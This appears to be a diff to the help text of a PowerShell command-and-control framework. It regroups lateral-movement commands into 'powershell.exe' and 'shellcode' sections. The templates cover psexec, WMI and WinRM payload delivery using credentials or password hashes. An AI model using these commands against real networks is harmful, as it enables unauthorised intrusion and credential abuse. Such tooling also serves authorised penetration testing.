@@ -307,7 +307,7 @@ invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -h
 """
 
 posh_help6 = """
-Lateral Movement:
+Lateral Movement - powershell.exe:
 =========================================================
 invoke-runaspayload -user <user> -password '<pass>' -domain <dom>
 invoke-runasproxypayload -user <user> -password '<pass>' -domain <dom>
@@ -319,13 +319,16 @@ invoke-psexecpayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -has
 invoke-psexecproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-psexecdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
 invoke-wmipayload -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional>
-invoke-wmijspayload -target <ip> -domain <dom> -username <user> -password '<pass>'
 invoke-wmipayload -target <ip> -cred <credid>
 invoke-wmiproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional>
-invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' 
 invoke-wmidaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
-invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 invoke-winrmsession -ipaddress <ip> -user <dom\\user> -pass <pass>
+
+Lateral Movement - shellcode:
+=========================================================
+invoke-wmijspayload -target <ip> -domain <dom> -username <user> -password '<pass>'
+invoke-wmijsproxypayload -target <ip> -domain <dom> -user <user> -pass '<pass>' 
+invoke-wmijsdaisypayload -target <ip> -domain <dom> -user <user> -pass '<pass>'
 """
 
 posh_help7 = """
